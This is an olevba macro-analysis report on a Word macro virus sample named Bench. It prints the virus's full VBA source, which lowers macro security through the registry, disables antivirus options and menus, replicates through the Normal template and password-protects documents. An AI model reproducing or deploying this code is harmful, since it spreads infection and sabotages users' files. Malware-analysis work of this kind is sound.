olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.d-37e11d8f1acfe2723e37fa86af01348e6a1c645a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.d-37e11d8f1acfe2723e37fa86af01348e6a1c645a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal
Application.StatusBar = True
StatusBar = "This Macro was made specially for you! You are one of the very priviledged! - [Bench]"
Application.Caption = "([Bench]MV) - A.L.T you always have a special place in my heart! I love you!"
If Month(Now) = Minute(Now) Then
Randomize: For x = 1 To 10: ActiveDocument.Shapes.AddShape(msoShapeCircles, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select: Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255)): Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next x
End If
If Day(Now) = Minute(Now) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[Bench]Macro Virus (c)"
        .Text = "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!" & vbCr & vbCr & "Click on me if you need any help!"
        .Animation = msoAnimationGreeting
        .Show
    End With
End If
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
' Word Version Checker - Checks for Word 2000 or Word 97
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If apllication.Version = 9# Then
    CommandBars("Macro").Controls("Security...").Enabled = False
End If
If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If
If nt = 0 And ad = 0 Then GoTo darn:
If nt = 0 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ad))
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 39, "Sub ViewVBCode()": End If
If ad = 0 Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, nt))
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 39, "Sub Bench()": End If
darn:
If nt <> 0 And ad = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub ' [B]MV.C Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97 - Added basic stealth]
Sub ViewVBCode()
On Error Resume Next
With Assistant.NewBalloon
.Heading = "[Bench] Macro Virus"
.Icon = msoIconAlert
.Text = "Trying to get rid of me eh? Well, now you will pay!"
.Animation = msoAnimationGetAttentionMajor
End With
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Password = "Bench": End If
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

